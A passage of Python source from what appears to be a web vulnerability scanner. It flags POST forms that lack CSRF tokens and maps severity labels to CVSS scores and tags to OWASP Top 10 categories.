        for form in crawl_data.get('forms', []):
            if form['method'] == 'POST':
                # Check if form has CSRF protection
                has_csrf_token = any(
                    any(keyword in inp['name'].lower() for keyword in ['csrf', 'token', 'nonce'])
                    for inp in form['inputs']
                )
                
                if not has_csrf_token:
                    vulnerability = {
                        'title': 'Missing CSRF Protection',
                        'severity': 'Medium',
                        'cvss': 5.4,
                        'description': 'Form lacks CSRF protection tokens, making it vulnerable to Cross-Site Request Forgery attacks.',
                        'url': form['action'],
                        'parameter': 'form',
                        'payload': '',
                        'remediation': 'Implement CSRF tokens for all state-changing operations.',
                        'discovered_by': 'Enhanced WebApp Agent',
                        'owasp_category': 'A01:2021 – Broken Access Control'
                    }
                    vulnerabilities.append(vulnerability)
        
        return vulnerabilities
    
    def _severity_to_cvss(self, severity: str) -> float:
        """Convert severity string to CVSS score"""
        severity_map = {
            'low': 3.1,
            'medium': 5.3,
            'high': 7.5,
            'critical': 9.1
        }
        return severity_map.get(severity.lower(), 3.1)
    
    def _get_owasp_category(self, tags: List[str]) -> str:
        """Get OWASP category from tags"""
        owasp_map = {
            'injection': 'A03:2021 – Injection',
            'xss': 'A03:2021 – Injection',
            'sqli': 'A03:2021 – Injection',
            'auth': 'A07:2021 – Identification and Authentication Failures',
            'access-control': 'A01:2021 – Broken Access Control',
            'config': 'A05:2021 – Security Misconfiguration',
            'crypto': 'A02:2021 – Cryptographic Failures'
        }
        
        for tag in tags:
            for key, category in owasp_map.items():
                if key in tag.lower():
                    return category
        
        return 'A06:2021 – Vulnerable and Outdated Components'
